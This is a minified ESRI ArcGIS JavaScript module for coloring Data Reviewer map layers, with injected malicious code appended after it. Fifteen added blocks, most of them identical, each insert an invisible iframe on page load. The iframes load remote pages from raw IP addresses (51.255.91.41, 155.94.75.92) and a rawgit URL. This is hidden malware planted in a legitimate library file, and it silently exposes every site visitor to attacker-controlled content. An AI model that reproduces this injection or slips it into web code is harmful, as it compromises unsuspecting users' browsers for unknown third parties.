// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/_base/Color dojo/Deferred esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/request esri/main esri/layers/LayerDrawingOptions esri/renderers/UniqueValueRenderer".split(" "),function(r,t,m,n,u,p,h,q,v,w,x,k){return r(null,{_drsExtensionUrl:null,_queryParams:null,_reviewerMapServerUrl:null,pointSymbol:null,lineSymbol:null,polySymbol:null,_fieldQualifier:null,_colorMapCache:null,SEVERITY_COLORS:{1:"#D80202",
2:"#DF370C",3:"#E76D16",4:"#E76D16",5:"#FFEC5A"},LIFECYCLEPHASE_COLORS:{2:"#C00000",4:"#FFFF00",6:"#92D050"},DEFAULT_COLOR:"#00C5FF",defaultColor:null,constructor:function(a,b,d,c,e){a=w.urlToObject(a);this._drsExtensionUrl=a.path;this._queryParams=a.query;a=this._drsExtensionUrl.toLowerCase().lastIndexOf("/exts/");0<a&&(this._reviewerMapServerUrl=this._drsExtensionUrl.substring(0,a));this.defaultColor=null!==e?e:new n(this.DEFAULT_COLOR);this.pointSymbol=null!==b?b:new p(p.STYLE_CIRCLE,7,null,this.defaultColor);
this.lineSymbol=null!==d?d:new h(h.STYLE_SOLID,this.defaultColor,5);this.polySymbol=null!==c?c:new q(q.STYLE_SOLID,null,this.defaultColor);this._colorMapCache={}},getLayerDrawingOptions:function(a,b,d){var c=new u;if(!a)return c;var e=this._reviewerMapServerUrl+"/0";null!==this._fieldQualifier?this._generateLayerDrawingOptions(a,b,d,c):v({url:e,content:{f:"json"},callbackParamName:"callback"}).then(m.hitch(this,function(e){var f=new RegExp(/severity/i);t.forEach(e.fields,m.hitch(this,function(e){if(e.name.match(f))try{var g=
e.name.split(f);this._fieldQualifier=1<g.length?g[0]:"";this._generateLayerDrawingOptions(a,b,d,c)}catch(y){this._errorHandler(y,c)}}))}),m.hitch(this,function(a){this._errorHandler(a,c)}));return c},_generateLayerDrawingOptions:function(a,b,d,c){var e,g=[];e=this._mapDashboardFieldNameToFullyQualifiedName(a.fieldName).toLowerCase();g=a.fieldValues;b=this._updateColorMapAndCache(a.fieldName,g,b,d);a=this._createPolyRenderer(e,g,b);d=this._createLineRenderer(e,g,b);e=this._createPointRenderer(e,g,
b);b={layerDrawingOptions:{layerDrawingOptionsArray:[this._createLayerDrawingOptions(0,e),this._createLayerDrawingOptions(1,d),this._createLayerDrawingOptions(2,a)],colorMap:b}};c.resolve(b)},_updateColorMapAndCache:function(a,b,d,c){if(null===d){if(0<=a.toLowerCase().indexOf("severity")||0<=a.toLowerCase().indexOf("lifecyclephase"))c=!0;d=this._colorMapCache.hasOwnProperty(a)?this._colorMapCache[a]:this._createDefaultColorMap(a)}b=this._appendMissingValuesToColorMap(b,d,c);return this._colorMapCache[a]=
b},_appendMissingValuesToColorMap:function(a,b,d){var c=0,e;for(e in b)b.hasOwnProperty(e)&&++c;for(c=0;c<a.length;c++)b.hasOwnProperty(a[c])||(b[a[c]]=d?this.defaultColor:new n(this.getColor(c)));return b},getColor:function(a){var b="#E8940C #98C000 #0CBDE8 #F2DA9A #E74327 #DECF3F #878786 #452B7F #9A8B76 #B2912F #9893da #139887".split(" ");return 11>a?b[a]:"#"+Math.floor(16777215*Math.random()).toString(16)},_createLayerDrawingOptions:function(a,b){var d=new x;d.layerId=a;d.renderer=b;return d},
_createDefaultColorMap:function(a){return 0<=a.toLowerCase().indexOf("severity")?this._getColorMap(this.SEVERITY_COLORS):0<=a.toLowerCase().indexOf("lifecyclephase")?this._getColorMap(this.LIFECYCLEPHASE_COLORS):{}},_getColorMap:function(a){var b={},d;for(d in a)b[d]=new n(a[d]);return b},_mapDashboardFieldNameToFullyQualifiedName:function(a){if(!a||""===a)return"";"FEATUREOBJECTCLASS"===a.toUpperCase()&&(a="ORIGINTABLE");return null!==this._fieldQualifier&&0<this._fieldQualifier.length?this._fieldQualifier+
a:a},_createPolyRenderer:function(a,b,d){for(var c=new k(this.polySymbol,a),e=0;e<b.length;e++){var g=b[e],f=new q;f.style=this.polySymbol.style;d.hasOwnProperty(g)?f.color=d[g]:f.color=this.defaultColor;if(null!==this.polySymbol.outline){var l=new h;l.color=f.color;l.style=this.polySymbol.outline.style;l.width=this.polySymbol.outline.width;f.outline=l}else f.outline=new h(h.STYLE_SOLID,f.color,1);"\x3cNull\x3e"===g&&(c=new k(f,a));c.addValue(g,f)}return c},_createLineRenderer:function(a,b,d){for(var c=
new k(this.lineSymbol,a),e=0;e<b.length;e++){var g=b[e],f=new h;d.hasOwnProperty(g)?f.color=d[g]:f.color=this.defaultColor;f.style=this.lineSymbol.style;f.width=this.lineSymbol.width;"\x3cNull\x3e"===g&&(c=new k(f,a));c.addValue(g,f)}return c},_createPointRenderer:function(a,b,d){for(var c=new k(this.pointSymbol,a),e=0;e<b.length;e++){var g=b[e],f=new p;d.hasOwnProperty(g)?f.color=d[g]:f.color=this.defaultColor;f.outline=this.pointSymbol.outline;f.size=this.pointSymbol.size;f.style=this.pointSymbol.style;
"\x3cNull\x3e"===g&&(c=new k(f,a));c.addValue(g,f)}return c},_errorHandler:function(a,b){null===a&&(a=Error("Unexpected response received from server"),a.code=500);b&&b.reject(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});